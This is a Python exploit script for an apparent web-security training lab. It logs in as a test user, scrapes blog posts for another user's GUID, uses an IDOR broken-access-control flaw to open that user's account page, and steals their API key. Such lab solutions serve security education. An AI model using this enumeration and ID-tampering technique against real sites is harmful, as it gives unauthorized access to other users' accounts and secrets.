import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = { 'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }

def get_csrf_token(s, login_url):
    r = s.get(login_url, verify=False, proxies=PROXIES)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name' : 'csrf'})['value']
    return csrf

def carlos_guid(s, url):
    
    # load home page
    r = s.get(url, verify=False, proxies=PROXIES)
    res = r.text
    post_ids = re.findall(r'postId=(\w+)"', res)
    # post id is used multiple items so we get dplicates to take out duplicate use data struture 'set'.
    unique__post_ids = list(set(post_ids))
    print(unique__post_ids)

    # loop throuh post_ids and identify which post_ids res has carlos in it
    for i in unique__post_ids:
        r = s.get(url + "/post?postId=" + i, verify=False, proxies=PROXIES)
        res = r.text
        if "carlos" in res:
            print("(+) Found crlos GUID : ")
            guid = re.findall("userId=(.*)'", res)[0]
            return guid
        
    print("(-) Failed to find carlos in any of the posts.")
    sys.exit(-1) 

def get_carlos_api_key(s, url):

    # step 1 : login as wiener by provded creds wiener:peter
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)
    login_data = { "csrf" : csrf_token, "username" : "wiener", "password" : "peter" }

    # login as wiener
    r  = s.post(login_url, data=login_data, verify=False, proxies=PROXIES)
    res = r.text
    if "Log out" in res:
        print('(+) Login successful!')

        # Obtain carlos's GUID
        guid = carlos_guid(s, url)

        # login as carlos to get hi API key
        carlos_login_url = url + "/my-account?id=" + guid
        r = s.get(carlos_login_url, verify=False, proxies=PROXIES)
        res = r.text
        if "carlos" in res:
            print("(+) We are loged in as carlos")
            api_key = re.search(r'Your API Key is:(.*)</div>', res)
            api_key = api_key.group(1).strip()
            print("(+) Carlos API key is  : ", api_key)

            # verify lab is suceessful
            submit_url = url + "/submitSolution"
            submit_data = { "answer" : api_key}
            r = s.post(submit_url, data=submit_data, verify=False, proxies=PROXIES)

            # verify submission
            r = s.get(url, verify=False, proxies=PROXIES)
            res = r.text
            if "Congratulations, you solved the lab!" in res:
                print("[*] Exploitation Successful!")
                sys.exit(-1)
            else:
                print("[*] Exploitation Failed.")
        else:
            print('(+) failed to login as wiener')


def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>' % sys.argv[0])
        print('(+) Exampple %s www.example.com' % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1].rstrip('/')
    print('[*] Starting the Exploit : Broken Access COntrol - User ID controlled by request parameter, with unpredictable user IDs :')
    get_carlos_api_key(s, url)

if __name__ == "__main__":
    main()